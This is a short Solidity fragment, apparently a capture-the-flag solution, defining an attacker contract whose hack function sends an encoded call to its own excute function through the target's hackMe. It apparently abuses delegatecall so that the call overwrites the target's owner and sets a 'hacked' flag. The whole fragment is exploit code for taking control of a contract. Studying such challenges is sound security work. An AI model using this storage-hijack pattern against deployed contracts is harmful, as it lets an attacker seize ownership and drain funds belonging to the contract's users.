...
contract HAckD31eg4t3{
    ...
    function hack(D31eg4t3 contadd) external {
        bytes memory funcSel=abi.encodeWithSignature("excute()");
        contadd.hackMe(funcSel);
        
    }

    function excute() external {
        owner=msg.sender;
        canYouHackMe[msg.sender] = true;
    }
